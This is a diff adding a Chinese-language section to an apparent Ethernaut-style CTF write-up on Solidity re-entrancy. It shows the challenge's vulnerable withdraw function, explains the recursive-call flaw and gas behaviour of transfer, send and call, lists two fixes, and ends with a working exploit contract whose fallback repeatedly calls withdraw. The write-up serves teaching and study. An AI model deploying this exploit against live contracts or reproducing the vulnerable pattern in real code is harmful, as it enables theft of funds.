@@ -204,3 +204,72 @@ web3.utils.toAscii(await web3.eth.getStorageAt(contract.address, 1))
 ```solidity
 givenaddress.transfer(msg.value);
 ```
+
+## Re-entrancy
+
+challeng代码中的withdraw函数：
+
+```solidity
+function withdraw(uint _amount) public {
+  if(balances[msg.sender] >= _amount) {
+    (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
+    if(result) {
+      _amount;
+    }
+    balances[msg.sender] -= _amount;
+  }
+}
+```
+
+执行的步骤为：
+1. 判断余额是否足够
+2. 转账
+3. 修改余额
+
+如果在第二步中，向一个合约地址转账，则会调用此合约的fallback函数(if exists)。
+
+在fallback函数中再调用challenge合约中的withdraw函数，由于在之前的withdraw调用中没有到第三步修改余额，所以此次依然能通过判断。由此实现递归调用withdraw。
+
+这就是重入攻击。
+
+还有一个细节在于gas。合约中转账三个函数：
+
+- `transfer()` 
+- `send()`
+- `call()`
+
+前两个函数只会传递固定的2300 gas。2300 gas足以在fallback函数中进行写下日志的操作，但不足以进行重入调用，因此可以防范重入攻击。
+
+而`call()`一般的用法为：`address.call{value: msg.value, gas: 1000000}("")`，可以自定义gas值，缺省默认所有。
+
+在开发过程中，让自己的合约代码受到2300 gas的限制还是挺难受的，因为随着以太坊的升级，同一个操作可能以后gas费会变，这就导致了合约代码向后兼容性的问题。因此大家用call还是挺多的，解决重入攻击两种方法：
+
+1. 在转帐前修改余额
+2. 全局锁
+
+exp：
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import './reentrance.sol';
+
+contract Reentrance_exp {
+    Reentrance target;
+    uint256 donated;
+    
+    constructor(address payable _target) public payable {
+        target = Reentrance(_target);
+        donated = msg.value;
+        target.donate{value: msg.value}(address(this));
+    }
+    
+    function attack() public payable{
+        target.withdraw(donated);
+    }
+    
+    fallback() external payable {
+        target.withdraw(donated);
+    }
+}
+```
